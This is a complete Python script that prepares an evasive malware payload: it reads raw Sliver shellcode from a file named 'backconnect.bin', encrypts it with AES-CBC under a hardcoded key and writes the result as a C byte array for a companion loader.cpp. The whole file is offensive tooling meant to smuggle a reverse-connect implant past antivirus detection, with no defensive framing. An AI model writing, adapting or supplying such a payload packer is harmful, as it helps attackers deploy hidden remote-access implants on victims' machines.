from Crypto.Cipher import AES               # AES encryption
from Crypto.Util.Padding import pad         # Padding for block size
import os                                   # For random IV generation and file handling

# AES encryption key (must be exactly 16 bytes = 128 bits)
key = b'ThisIsA16ByteKey'                   # Matches key in loader.cpp

# Generate a random 16-byte IV (initialization vector)
iv = os.urandom(16)

# Read raw Sliver shellcode from file
with open("backconnect.bin", "rb") as f:
    shellcode = f.read()

# Create AES cipher in CBC mode using key and IV
cipher = AES.new(key, AES.MODE_CBC, iv)

# Encrypt the padded shellcode (pad to block size of 16 bytes)
enc = cipher.encrypt(pad(shellcode, 16))

# Write the payload as a C-style header to embedded_payload.h
# This header is #included by loader.cpp
with open("embedded_payload.h", "w") as f:
    f.write("unsigned char payload[] = {")
    for b in iv + enc:                      # Prepend IV to the encrypted shellcode
        f.write(f"0x{b:02x},")
    f.write("};\n")
    f.write(f"unsigned int payload_len = {len(iv + enc)};\n")
